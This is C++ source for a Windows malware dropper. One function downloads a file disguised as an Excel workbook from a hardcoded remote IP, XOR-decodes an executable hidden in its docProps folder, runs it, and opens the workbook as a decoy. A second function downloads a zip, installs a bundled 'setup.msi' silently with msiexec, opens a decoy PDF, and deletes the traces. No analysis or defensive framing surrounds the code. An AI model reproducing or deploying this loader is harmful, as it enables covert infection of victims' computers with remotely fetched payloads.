#include "httplib.h"
#include <Windows.h>
#include <stdio.h>
#include "unzip.h"

#include <Shlwapi.h>
#include <Shlobj.h>
#include "Common.h"

#pragma comment(lib, "Shlwapi.lib")

using namespace httplib;

#include <regex>

bool Downloader(const char* url, const char* save_path) {
    std::regex rgx(R"(http://([^/:]+)(:(\d+))?(/.*))");
    std::cmatch match;

    if (!std::regex_match(url, match, rgx)) {
        std::cout << "Invalid URL\n";
        return false;
    }

    std::string host = match[1];
    std::string portStr = match[3];
    std::string path = match[4];

    int port = portStr.empty() ? 80 : std::stoi(portStr);

    httplib::Client cli(host, port);

    auto res = cli.Get(path.c_str());
    if (!res || res->status != 200) {
        std::cout << "Download failed: " << (res ? res->status : -1) << std::endl;
        return false;
    }

    FILE* f = fopen(save_path, "wb");
    if (!f) return false;

    fwrite(res->body.data(), 1, res->body.size(), f);
    fclose(f);

    return true;
}

std::wstring GetDefaultPdfViewer()
{
    PWSTR app = nullptr;
    AssocQueryStringW(
        ASSOCF_NONE,
        ASSOCSTR_EXECUTABLE,
        L".xlsx",
        NULL,
        NULL,
        NULL
    );

    DWORD size = 0;
    AssocQueryStringW(
        0, ASSOCSTR_EXECUTABLE, L".xlsx",
        NULL, NULL, &size
    );

    std::wstring result(size, L'\0');
    AssocQueryStringW(
        0, ASSOCSTR_EXECUTABLE, L".xlsx",
        NULL, &result[0], &size
    );

    return result;
}

void OpenWithDefaultApp(std::wstring filePath)
{
    std::wstring cmd = L"cmd.exe /C start \"\" \"" + filePath + L"\"";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);
    PROCESS_INFORMATION pi{};


    CreateProcessW(
        NULL,
        (LPWSTR)cmd.c_str(),
        NULL, NULL,
        FALSE,
        0,
        NULL, NULL,
        &si,
        &pi
    );

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

#define SAVE_NAME L"tai_lieu.xlsx"
#define TEMP_ZIP L"temp.zip"

int RunDownloaderExcel() {
    const char* url_office = "http://149.248.52.207:8080/office.xlsx";
    Downloader(url_office, WstringToString(SAVE_NAME).c_str());
    CopyFile(SAVE_NAME, TEMP_ZIP, FALSE);
    wchar_t currentDir[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, currentDir);
    std::wstring zipPath = std::wstring(currentDir) + L"\\" + TEMP_ZIP;
    if (!unzip_single_file(zipPath.c_str(), L"docProps", currentDir)) {
        return 0;
    }

    std::wstring pathExcel = SAVE_NAME;

    std::wstring exePath = std::wstring(currentDir) + L"\\docProps\\app_0.xml";

    XorDecodeFileInplace(exePath, 198);
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    if (!CreateProcessW(
        NULL,
        (LPWSTR)exePath.c_str(),
        NULL, NULL,
        FALSE,
        0,
        NULL, NULL,
        &si, &pi
    )) {
        //std::cout << "CreateProcess failed: " << GetLastError() << std::endl;
    }

    OpenWithDefaultApp(SAVE_NAME);
}

int RunDownloadFile() {
    const wchar_t* tempZip = L"temp.zip";
    const wchar_t* officeName = L"office";
    const wchar_t* officeExt = L".pdf";
    const wchar_t* malName = L"setup";
    const wchar_t* malExt = L".msi";
    const char *url = "http://192.168.242.133:8080/office.zip";
    if (!Downloader(url, WstringToString(tempZip).c_str())) {
        return 0;
    }

    wchar_t curDir[MAX_PATH] = { 0 };
    GetCurrentDirectoryW(MAX_PATH, curDir);
    std::wstring zipPath = std::wstring(curDir) + L"\\" + tempZip;
    std::wcout << zipPath;
    if (!unzip_single_file(zipPath.c_str(), malName, curDir)) {
        return 0;
    }

    if (!unzip_single_file(zipPath.c_str(), officeName, curDir)) {
        return 0;
    }

    std::wstring exePath = curDir + std::wstring(L"\\") + std::wstring(malName) + std::wstring(malExt);

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    std::wstring cmd = L"msiexec.exe /i \"" + exePath + L"\" /qn";
    std::wcout << cmd << std::endl;

    if (!CreateProcessW(
        NULL,
        (LPWSTR)cmd.c_str(),
        NULL, NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    )) {
        //std::cout << "CreateProcess failed: " << GetLastError() << std::endl;
    }

    OpenWithDefaultApp(std::wstring(officeName) + officeExt);

    Sleep(2000);

    DeleteFileW((std::wstring(malName) + malExt).c_str());
    DeleteFileW(zipPath.c_str());
    DeleteFileW((std::wstring(officeName) + officeExt).c_str());
    return 1;
}